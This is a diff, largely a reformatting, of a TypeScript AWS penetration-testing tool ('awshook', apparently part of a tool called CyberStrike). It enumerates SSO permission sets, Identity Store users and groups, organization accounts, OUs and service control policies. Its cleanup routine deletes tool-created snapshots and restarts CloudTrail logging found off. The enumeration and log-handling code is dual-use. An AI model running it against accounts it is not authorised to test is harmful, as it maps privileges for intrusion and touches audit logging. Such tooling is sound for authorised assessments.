+      output: `[-] Cannot list SSO instances: ${instances.stderr.trim()}\n[*] SSO may not be configured or region may be wrong`,
+      findings,
+    }
 
   const instanceList = tryJson(instances.stdout)?.Instances || []
   output.push(`[+] SSO Instances: ${instanceList.length}`)
@@ -680,19 +1019,33 @@ async function ssoEnum(args: string[], timeout: number): Promise<HookResult> {
   output.push(`[*] Using instance: ${targetArn}`)
   output.push(`[*] Identity Store: ${identityStoreId}\n`)
 
-  const permSets = await aws(["sso-admin", "list-permission-sets", "--instance-arn", targetArn], profile, region, timeout)
+  const permSets = await aws(
+    ["sso-admin", "list-permission-sets", "--instance-arn", targetArn],
+    profile,
+    region,
+    timeout,
+  )
   if (permSets.exitCode === 0) {
     const psArns = tryJson(permSets.stdout)?.PermissionSets || []
     output.push(`[+] Permission Sets: ${psArns.length}`)
     for (const psArn of psArns) {
-      const desc = await aws(["sso-admin", "describe-permission-set", "--instance-arn", targetArn, "--permission-set-arn", psArn], profile, region, timeout)
+      const desc = await aws(
+        ["sso-admin", "describe-permission-set", "--instance-arn", targetArn, "--permission-set-arn", psArn],
+        profile,
+        region,
+        timeout,
+      )
       if (desc.exitCode === 0) {
         const ps = tryJson(desc.stdout)?.PermissionSet || {}
         output.push(`    ${ps.Name} — session: ${ps.SessionDuration || "default"} — ${psArn}`)
         if (ps.Name === "AdministratorAccess" || ps.Name === "PowerUserAccess") {
           findings.push({
-            checkId: `AWS-SSO-${findings.length + 1}`, provider: "aws", severity: "high", status: "FOUND",
-            resource: psArn, title: `High-privilege permission set: ${ps.Name}`,
+            checkId: `AWS-SSO-${findings.length + 1}`,
+            provider: "aws",
+            severity: "high",
+            status: "FOUND",
+            resource: psArn,
+            title: `High-privilege permission set: ${ps.Name}`,
             details: `SSO permission set ${ps.Name} grants broad access`,
             remediation: "Review who is assigned this permission set",
           })
@@ -702,7 +1055,12 @@ async function ssoEnum(args: string[], timeout: number): Promise<HookResult> {
   }
 
   if (identityStoreId) {
-    const users = await aws(["identitystore", "list-users", "--identity-store-id", identityStoreId], profile, region, timeout)
+    const users = await aws(
+      ["identitystore", "list-users", "--identity-store-id", identityStoreId],
+      profile,
+      region,
+      timeout,
+    )
     if (users.exitCode === 0) {
       const userList = tryJson(users.stdout)?.Users || []
       output.push(`\n[+] Identity Store Users: ${userList.length}`)
@@ -711,7 +1069,12 @@ async function ssoEnum(args: string[], timeout: number): Promise<HookResult> {
       }
     }
 
-    const groups = await aws(["identitystore", "list-groups", "--identity-store-id", identityStoreId], profile, region, timeout)
+    const groups = await aws(
+      ["identitystore", "list-groups", "--identity-store-id", identityStoreId],
+      profile,
+      region,
+      timeout,
+    )
     if (groups.exitCode === 0) {
       const groupList = tryJson(groups.stdout)?.Groups || []
       output.push(`\n[+] Identity Store Groups: ${groupList.length}`)
@@ -719,7 +1082,12 @@ async function ssoEnum(args: string[], timeout: number): Promise<HookResult> {
     }
   }
 
-  const accounts = await aws(["organizations", "list-accounts", "--query", "Accounts[].[Id,Name,Status]"], profile, region, timeout)
+  const accounts = await aws(
+    ["organizations", "list-accounts", "--query", "Accounts[].[Id,Name,Status]"],
+    profile,
+    region,
+    timeout,
+  )
   if (accounts.exitCode === 0) {
     const acctList = tryJson(accounts.stdout) || []
     output.push(`\n[+] Organization Accounts: ${acctList.length}`)
@@ -736,7 +1104,11 @@ async function orgEnum(args: string[], timeout: number): Promise<HookResult> {
   const output: string[] = ["[*] AWS Organizations Enumeration\n"]
 
   const org = await aws(["organizations", "describe-organization"], profile, region, timeout)
-  if (org.exitCode !== 0) return { output: `[-] Cannot describe organization: ${org.stderr.trim()}\n[*] This account may not be part of an Organization`, findings }
+  if (org.exitCode !== 0)
+    return {
+      output: `[-] Cannot describe organization: ${org.stderr.trim()}\n[*] This account may not be part of an Organization`,
+      findings,
+    }
 
   const orgInfo = tryJson(org.stdout)?.Organization || {}
   output.push(`[+] Organization: ${orgInfo.Id}`)
@@ -752,8 +1124,12 @@ async function orgEnum(args: string[], timeout: number): Promise<HookResult> {
       if (a.Id === orgInfo.MasterAccountId) output.push(`      ^ MANAGEMENT ACCOUNT`)
     }
     findings.push({
-      checkId: "AWS-ORG-001", provider: "aws", severity: "info", status: "ENUMERATED",
-      resource: `org:${orgInfo.Id}`, title: `AWS Organization enumerated: ${acctList.length} accounts`,
+      checkId: "AWS-ORG-001",
+      provider: "aws",
+      severity: "info",
+      status: "ENUMERATED",
+      resource: `org:${orgInfo.Id}`,
+      title: `AWS Organization enumerated: ${acctList.length} accounts`,
       details: `Management account: ${orgInfo.MasterAccountId}, feature set: ${orgInfo.FeatureSet}`,
       remediation: "Review cross-account trust policies and SCPs",
     })
@@ -765,15 +1141,27 @@ async function orgEnum(args: string[], timeout: number): Promise<HookResult> {
     for (const root of rootList) {
       output.push(`\n[+] Root: ${root.Id} (${root.Name})`)
       const enabledPolicies = (root.PolicyTypes || []).filter((p: Record<string, string>) => p.Status === "ENABLED")
-      output.push(`    Enabled policy types: ${enabledPolicies.map((p: Record<string, string>) => p.Type).join(", ") || "none"}`)
+      output.push(
+        `    Enabled policy types: ${enabledPolicies.map((p: Record<string, string>) => p.Type).join(", ") || "none"}`,
+      )
 
-      const ous = await aws(["organizations", "list-organizational-units-for-parent", "--parent-id", root.Id], profile, region, timeout)
+      const ous = await aws(
+        ["organizations", "list-organizational-units-for-parent", "--parent-id", root.Id],
+        profile,
+        region,
+        timeout,
+      )
       if (ous.exitCode === 0) {
         const ouList = tryJson(ous.stdout)?.OrganizationalUnits || []
         output.push(`    OUs: ${ouList.length}`)
         for (const ou of ouList) {
           output.push(`      ${ou.Id} — ${ou.Name}`)
-          const childOus = await aws(["organizations", "list-organizational-units-for-parent", "--parent-id", ou.Id], profile, region, timeout)
+          const childOus = await aws(
+            ["organizations", "list-organizational-units-for-parent", "--parent-id", ou.Id],
+            profile,
+            region,
+            timeout,
+          )
           if (childOus.exitCode === 0) {
             const children = tryJson(childOus.stdout)?.OrganizationalUnits || []
             for (const child of children) output.push(`        ${child.Id} — ${child.Name}`)
@@ -783,14 +1171,24 @@ async function orgEnum(args: string[], timeout: number): Promise<HookResult> {
     }
   }
 
-  const scps = await aws(["organizations", "list-policies", "--filter", "SERVICE_CONTROL_POLICY"], profile, region, timeout)
+  const scps = await aws(
+    ["organizations", "list-policies", "--filter", "SERVICE_CONTROL_POLICY"],
+    profile,
+    region,
+    timeout,
+  )
   if (scps.exitCode === 0) {
     const scpList = tryJson(scps.stdout)?.Policies || []
     output.push(`\n[+] Service Control Policies: ${scpList.length}`)
     for (const scp of scpList) {
       output.push(`    ${scp.Id} — ${scp.Name} (${scp.AwsManaged ? "AWS Managed" : "Custom"})`)
       if (!scp.AwsManaged) {
-        const content = await aws(["organizations", "describe-policy", "--policy-id", scp.Id, "--query", "Policy.Content"], profile, region, timeout)
+        const content = await aws(
+          ["organizations", "describe-policy", "--policy-id", scp.Id, "--query", "Policy.Content"],
+          profile,
+          region,
+          timeout,
+        )
         if (content.exitCode === 0) {
           const doc = tryJson(tryJson(content.stdout) || "{}")
           const statements = doc?.Statement || []
@@ -820,27 +1218,53 @@ async function cleanupAws(args: string[], timeout: number): Promise<HookResult> 
   const mode = dryRun ? "DRY RUN" : "LIVE"
   const output = [`[*] CyberStrike AWS cleanup — ${mode}\n`]
 
-  const snaps = await aws(["ec2", "describe-snapshots", "--owner-ids", "self", "--filters", "Name=tag:CreatedBy,Values=CyberStrike", "--query", "Snapshots[].SnapshotId"], profile, region, timeout)
+  const snaps = await aws(
+    [
+      "ec2",
+      "describe-snapshots",
+      "--owner-ids",
+      "self",
+      "--filters",
+      "Name=tag:CreatedBy,Values=CyberStrike",
+      "--query",
+      "Snapshots[].SnapshotId",
+    ],
+    profile,
+    region,
+    timeout,
+  )
   if (snaps.exitCode === 0) {
     const snapList = tryJson(snaps.stdout) || []
     output.push(`[+] Snapshots to clean: ${snapList.length}`)
     for (const s of snapList) {
-      if (dryRun) { output.push(`    Would delete: ${s}`) }
-      else {
+      if (dryRun) {
+        output.push(`    Would delete: ${s}`)
+      } else {
         await aws(["ec2", "delete-snapshot", "--snapshot-id", s], profile, region, timeout)
         output.push(`    Deleted: ${s}`)
       }
     }
   }
 
-  const rdsSnaps = await aws(["rds", "describe-db-snapshots", "--query", "DBSnapshots[?contains(DBSnapshotIdentifier,'cs-snap-')].[DBSnapshotIdentifier]"], profile, region, timeout)
+  const rdsSnaps = await aws(
+    [
+      "rds",
+      "describe-db-snapshots",
+      "--query",
+      "DBSnapshots[?contains(DBSnapshotIdentifier,'cs-snap-')].[DBSnapshotIdentifier]",
+    ],
+    profile,
+    region,
+    timeout,
+  )
   if (rdsSnaps.exitCode === 0) {
     const rdsList = tryJson(rdsSnaps.stdout) || []
     output.push(`[+] RDS snapshots to clean: ${rdsList.length}`)
     for (const s of rdsList) {
       const snapId = s[0]
-      if (dryRun) { output.push(`    Would delete: ${snapId}`) }
-      else {
+      if (dryRun) {
+        output.push(`    Would delete: ${snapId}`)
+      } else {
         await aws(["rds", "delete-db-snapshot", "--db-snapshot-identifier", snapId], profile, region, timeout)
         output.push(`    Deleted: ${snapId}`)
       }
@@ -849,12 +1273,13 @@ async function cleanupAws(args: string[], timeout: number): Promise<HookResult> 
 
   const trails = await aws(["cloudtrail", "describe-trails", "--query", "trailList[].[Name]"], profile, region, timeout)
   if (trails.exitCode === 0) {
-    for (const t of (tryJson(trails.stdout) || [])) {
+    for (const t of tryJson(trails.stdout) || []) {
       const status = await aws(["cloudtrail", "get-trail-status", "--name", t[0]], profile, region, timeout)
       const s = tryJson(status.stdout)
       if (!s?.IsLogging) {
-        if (dryRun) { output.push(`    Would restart logging: ${t[0]}`) }
-        else {
+        if (dryRun) {
+          output.push(`    Would restart logging: ${t[0]}`)
+        } else {
           await aws(["cloudtrail", "start-logging", "--name", t[0]], profile, region, timeout)
           output.push(`[+] Restarted logging: ${t[0]}`)
         }
@@ -887,12 +1312,15 @@ export const AwshookTool = Tool.define("awshook", {
     if (check.exitCode !== 0) {
       return {
         title: `awshook: ${params.program}`,
-        output: "AWS CLI not found. Install: https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html",
+        output:
+          "AWS CLI not found. Install: https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html",
         metadata: { program: params.program, findings: [] as Finding[] },
       }
     }
 
-    const wrap = (fn: () => Promise<string>): (() => Promise<HookResult>) => async () => ({ output: await fn(), findings: [] })
+    const wrap =
+      (fn: () => Promise<string>): (() => Promise<HookResult>) =>
+      async () => ({ output: await fn(), findings: [] })
 
     const dispatch: Record<Program, () => Promise<HookResult>> = {
       iam_enum: () => iamEnum(params.args, params.timeout_seconds),
